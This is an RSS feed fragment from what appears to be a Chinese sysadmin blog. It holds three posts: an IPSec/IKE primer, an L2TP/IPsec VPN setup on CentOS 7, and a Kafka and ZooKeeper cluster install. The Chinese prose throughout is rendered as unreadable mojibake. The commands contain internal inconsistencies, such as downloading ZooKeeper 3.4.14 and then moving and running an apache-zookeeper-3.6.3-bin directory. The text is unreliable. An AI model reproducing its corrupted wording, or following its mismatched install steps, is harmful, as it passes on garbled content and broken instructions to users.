&lt;p&gt;å…¬å¸çš„ä¸»è·¯ç”±å™¨æ˜¯é”æ·çš„NBR6205-Eï¼Œä½œä¸ºIPSecçš„æœåŠ¡ç«¯ï¼Œè€Œé˜¿é‡Œäº‘ä½œä¸ºå®¢æˆ·ç«¯ã€‚&lt;/p&gt;
&lt;p&gt;é¦–å…ˆå…ˆæ™®åŠä¸€ä¸‹IPSecçš„çŸ¥è¯†ï¼ŒIPSecç›®å‰åªæ”¯æŒIPv4å•æ’­ï¼š&lt;/p&gt;
&lt;p&gt;å¯†é’¥å®‰å…¨æœ‰ IKE è´Ÿè´£ï¼›æ•°æ®å®‰å…¨æ–¹é¢ï¼Œæœ‰ IPSec è´Ÿè´£ã€‚&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯IKEä¹Ÿæ˜¯ IPSec çš„ ä¸€ éƒ¨åˆ†ï¼Œä¸èƒ½ç‹¬ç«‹å­˜åœ¨ã€‚å­˜åœ¨ä¸¤ä¸ªSAåˆ†åˆ«ä¸º&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;ISAKMP Security Associationï¼ˆIKE SAï¼‰&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;IPsec Security Associationï¼ˆIPsec SAï¼‰&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;åœ¨è¿™é‡Œæ³¨æ„ä¸€ç‚¹å°±æ˜¯IKE SA=ISAKMP SA&lt;/p&gt;
&lt;p&gt;IKE SAçš„ lifetime é»˜è®¤ä¸º 86400 ç§’ï¼Œå³ä¸€å¤©ï¼Œé»˜è®¤æ²¡æœ‰volume limitã€‚&lt;/p&gt;
&lt;p&gt;ç”¨æˆ·çš„æ•°æ®æµé‡çœŸæ­£æ˜¯åœ¨ IPsec SA ä¸Šä¼ é€’çš„ï¼Œè€Œä¸æ˜¯åœ¨IKE SAï¼›&lt;/p&gt;
&lt;p&gt;IPsec SAç›´æ¥ä¸ºç”¨æˆ·æ•°æ®æµæœåŠ¡ï¼ŒIPsec SAä¸­çš„æ‰€æœ‰å®‰å…¨ç­–ç•¥éƒ½æ˜¯ä¸ºäº†ç”¨æˆ·æ•°æ®æµçš„å®‰å…¨ã€‚&lt;/p&gt;
&lt;p&gt;IPsec SAçš„ lifetime é»˜è®¤ä¸º3600 ç§’ï¼Œå³1å°æ—¶ï¼›é»˜è®¤volume limitä¸º4608000 Kbytesï¼Œå³4.608 Gbyteã€‚&lt;/p&gt;
&lt;p&gt;å› ä¸ºSAæœ‰ä¸¤ä¸ªï¼Œåˆ†ä¸ºIKE SAå’ŒIPsec SAï¼Œä¸¤ä¸ªSAåˆ†åˆ«å®šä¹‰äº†å¦‚ä½•ä¿æŠ¤å¯†é’¥ä»¥åŠå¦‚ä½•ä¿æŠ¤æ•°æ®ï¼Œå…¶å®è¿™ä¸¤ä¸ªSAéƒ½æ˜¯ç”±IKEå»ºç«‹èµ·æ¥çš„ï¼Œæ‰€ä»¥å°†IKEçš„æ•´ä¸ªè¿è¡Œè¿‡ç¨‹åˆ†æˆäº†ä¸¤ä¸ªPhaseï¼ˆé˜¶æ®µï¼‰ï¼Œå³ ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;IKE Phase Two&lt;/li&gt;
&lt;li&gt;IKE Phase One&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;ä¸€ike-phase-oneç¬¬ä¸€é˜¶æ®µ&#34;&gt;ä¸€ã€IKE Phase Oneç¬¬ä¸€é˜¶æ®µ&lt;/h4&gt;
&lt;p&gt;IKE Phase Oneçš„ä¸»è¦å·¥ä½œå°±æ˜¯å»ºç«‹IKE SAï¼ˆISAKMP SAï¼‰ï¼ŒIKE SAçš„æœåŠ¡å¯¹è±¡å¹¶ä¸æ˜¯ç”¨æˆ·æ•°æ®ï¼Œè€Œæ˜¯å¯†é’¥æµé‡ï¼Œä»¥åŠä¸ºIPsec SAæœåŠ¡çš„ï¼›IKE SAçš„åå•†é˜¶æ®µè¢«ç§°ä¸ºmain modeï¼ˆä¸»æ¨¡å¼ï¼‰è¿˜æœ‰ aggressive é‡è›®æ¨¡å¼ï¼ŒIKEä¹Ÿæ˜¯éœ€è¦ä¿æŠ¤è‡ªå·±çš„æµé‡å®‰å…¨çš„ï¼ˆè¿™äº›æµé‡å¹¶éç”¨æˆ·æµé‡ï¼‰ï¼Œæ‰€ä»¥IKE SAä¹‹é—´ä¹Ÿéœ€è¦åå•†å‡ºä¸€æ•´å¥—å®‰å…¨ç­–ç•¥ï¼Œå¦åˆ™åç»­çš„å¯†é’¥å’ŒIPsec SAçš„å»ºç«‹å°±ä¸èƒ½å¾—åˆ°å®‰å…¨ä¿è¯ï¼›&lt;/p&gt;</description>
    </item>
    <item>
      <title>L2TP VPNåœ¨CentOS7ç³»ç»Ÿä¸‹çš„æ­å»º</title>
      <link>https://rendoumi.com/posts/20221113-l2tp_vpn/</link>
      <pubDate>Sun, 13 Nov 2022 10:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20221113-l2tp_vpn/</guid>
      <description>&lt;p&gt;è¿™æ˜¯ä¸ªå¾ˆå¥‡æ€ªçš„äº‹æƒ…ï¼Œåº”è˜äº†ä¸€å®¶æ CDN çš„å…¬å¸ï¼Œç»“æœä¸Šå»çœ‹äº†ä¸€ä¸‹æ ¹æœ¬ä¸å¯¹è·¯ã€‚å°±ç«‹åˆ»è¾äº†ï¼Œä½†æ˜¯å‘ç°å®ƒç»™å‘˜å·¥å¼€çš„ L2TP VPN ç¡®å®éå¸¸å¥½ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;äºæ˜¯å°±è‡ªå·±ä¹Ÿæ­ä¸€ä¸ªï¼Œæ–¹ä¾¿è‡ªç”¨ã€‚ä¸‹é¢è®°å½•ä¸€ä¸‹å®‰è£…è¿‡ç¨‹ï¼Œç¯å¢ƒæ˜¯CentOS 7&lt;/p&gt;
&lt;h4 id=&#34;ä¸€è£…l2tp&#34;&gt;ä¸€ã€è£…L2TP&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# yum install epel-release&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# yum install xl2tpd libreswan&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;äºŒä¿®æ”¹æ ¸å¿ƒå‚æ•°&#34;&gt;äºŒã€ä¿®æ”¹æ ¸å¿ƒå‚æ•°&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# vi /etc/sysctl.conf&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vm.swappiness &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net.ipv4.neigh.default.gc_stale_time&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;120&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net.ipv4.conf.all.rp_filter&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net.ipv4.conf.default.rp_filter&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net.ipv4.conf.default.arp_announce &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net.ipv4.conf.all.arp_announce&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net.ipv4.tcp_max_tw_buckets &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;5000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net.ipv4.tcp_syncookies &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net.ipv4.tcp_max_syn_backlog &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1024&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net.ipv4.tcp_synack_retries &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net.ipv4.conf.lo.arp_announce&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net.ipv4.ip_forward &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net.ipv4.conf.default.accept_redirects &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net.ipv4.conf.default.send_redirects &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net.ipv4.conf.default.accept_source_route &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# sysctl -p&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;ä¸‰é…ç½®-ipsec&#34;&gt;ä¸‰ã€é…ç½® IPSEC&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# vi /etc/ipsec.d/l2tp_psk.conf&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;conn L2TP-PSK-NAT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     &lt;span class=&#34;nv&#34;&gt;rightsubnet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;vhost:%priv
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     &lt;span class=&#34;nv&#34;&gt;also&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;L2TP-PSK-noNAT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;conn L2TP-PSK-noNAT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     &lt;span class=&#34;nv&#34;&gt;authby&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;secret
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     &lt;span class=&#34;nv&#34;&gt;pfs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;no
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     &lt;span class=&#34;nv&#34;&gt;auto&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;add
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     &lt;span class=&#34;nv&#34;&gt;keyingtries&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     &lt;span class=&#34;nv&#34;&gt;dpddelay&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;30&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     &lt;span class=&#34;nv&#34;&gt;dpdtimeout&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;120&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     &lt;span class=&#34;nv&#34;&gt;dpdaction&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;clear
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     &lt;span class=&#34;nv&#34;&gt;rekey&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;no
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     &lt;span class=&#34;nv&#34;&gt;ikelifetime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;8h
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     &lt;span class=&#34;nv&#34;&gt;keylife&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1h
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     &lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;transport
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     &lt;span class=&#34;nv&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;192.168.10.232
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     &lt;span class=&#34;nv&#34;&gt;leftprotoport&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;17/1701
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     &lt;span class=&#34;nv&#34;&gt;right&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;%any
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     &lt;span class=&#34;nv&#34;&gt;rightprotoport&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;17/%any
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„ä¸Šé¢çš„ left=192.168.10.232ï¼Œè¿™æ˜¯æœåŠ¡å™¨çš„ipåœ°å€ï¼Œè¦æ›´æ¢ä¸ºè‡ªå·±æœåŠ¡å™¨çš„åœ°å€ï¼ˆå¦‚æœåœ¨é˜²ç«å¢™åï¼Œå†™å†…ç½‘åœ°å€ï¼Œéæ˜ å°„åçš„å…¬ç½‘IPï¼‰&lt;/p&gt;</description>
    </item>
    <item>
      <title>Kafkaçš„å®‰è£…å’ŒéªŒè¯</title>
      <link>https://rendoumi.com/posts/20221113-kafka/</link>
      <pubDate>Sun, 13 Nov 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20221113-kafka/</guid>
      <description>&lt;p&gt;ç”Ÿäº§ç¯å¢ƒè¦ç”¨åˆ°kafkaï¼Œè®°å½•ä¸€ä¸‹å®‰è£…è¿‡ç¨‹ï¼Œå…¶å®æœ€é‡è¦çš„ä¸æ˜¯å®‰è£…ï¼Œè€Œæ˜¯ä½¿ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;æ—¶é—´èŠ‚ç‚¹æ˜¯2022å¹´7æœˆ10æ—¥ï¼Œzookeeperçš„ç‰ˆæœ¬æ˜¯3.4.14ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://mirrors.cnnic.cn/apache/zookeeper/stable/zookeeper-3.4.14.tar.gz
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;kafkaçš„ç‰ˆæœ¬æ˜¯3.2ï¼Œæ³¨æ„å‰é¢çš„2.13æ˜¯scalaçš„ç‰ˆæœ¬&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget http://archive.apache.org/dist/kafka/3.2.0/kafka_2.13-3.2.0.tgz
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è½¯ä»¶éƒ½ä¸‹è½½å¥½ä»¥åï¼Œæ‰¾ä¸‰å°æœåŠ¡å™¨ï¼Œè½¯ä»¶éƒ½æ”¾åˆ° /usr/local è·¯å¾„ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;æœåŠ¡å™¨çš„ipæ˜¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;172.18.31.50
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;172.18.31.51
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;172.18.31.52
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç§»åŠ¨è½¯ä»¶ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tar zxvf zookeeper-3.4.14.tar.gz
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mv apache-zookeeper-3.6.3-bin /usr/local
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tar zxvf kafka_2.13-3.2.0.tgz
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mv kafka_2.13-3.2.0 /usr/local
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åå¾—è£… java äº†ï¼Œcentos ç‰ˆæœ¬&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum -y install epel-release
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum -y install java-11-openjdk-devel
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é¦–å…ˆå»ç¼–è¾‘zookeeperçš„é…ç½®æ–‡ä»¶ï¼Œç„¶åå¯åŠ¨&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cp /usr/local/apache-zookeeper-3.6.3-bin/conf/zoo_sample.cfg /usr/local/apache-zookeeper-3.6.3-bin/conf/zoo.cfg
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç¼–è¾‘zoo.cfgï¼Œå¢åŠ å‡ è¡Œ&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;dataDir&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/data/zookeeper
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;metricsProvider.className&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;org.apache.zookeeper.metrics.prometheus.PrometheusMetricsProvider
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;metricsProvider.httpPort&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;7000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;metricsProvider.exportJvmInfo&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;server.0&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;172.18.31.50:20881:30881
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;server.1&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;172.18.31.51:20881:30881
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;server.2&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;172.18.31.52:20881:30881
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„ä¸Šé¢ï¼Œæˆ‘ä»¬çš„æ•°æ®ç›®å½•æ˜¯åœ¨/data/zookeeperï¼Œæ‰€ä»¥è¦å…ˆå»ºç«‹å¥½ç›®å½•ç»“æ„&lt;/p&gt;
&lt;p&gt;ç„¶åæœ‰ä¸‰å°æœåŠ¡å™¨ä¹ˆï¼ŒæŠŠå„è‡ªçš„idæ”¾åˆ°æ–‡ä»¶ä¸­ï¼Œç„¶å20881æ˜¯ä¸‰å°æœåŠ¡å™¨ä¹‹é—´çš„é€šè®¯ç«¯å£ï¼Œ30881æ˜¯é€‰ä¸¾ç«¯å£&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir /data/zookeeper -p
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &amp;gt;/data/zookeeper/myid
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸‰å°æœåŠ¡å™¨åˆ†åˆ«å¯åŠ¨&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/local/apache-zookeeper-3.6.3-bin/bin/zkServer.sh start
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;éªŒè¯ä¸€ä¸‹&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/local/apache-zookeeper-3.6.3-bin/bin/zkCli.sh
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;zk: localhost:2181&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;CONNECTED&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ls /
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;admin, brokers, cluster, config, consumers, controller, controller_epoch, feature, isr_change_notification, latest_producer_id_block, log_dir_event_notification, zookeeper&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;çœ‹çœ‹ / ä¸‹æœ‰ä¸œè¥¿å°±è¡Œäº†ï¼Œä¸Šé¢æ˜¯å·²ç»è£…å¥½äº† kafka å’Œ cruisecontrolçš„æƒ…å½¢ï¼Œä¸œè¥¿å°±æ¯”è¾ƒå¤šäº†&lt;/p&gt;</description>
    </item>
    <item>
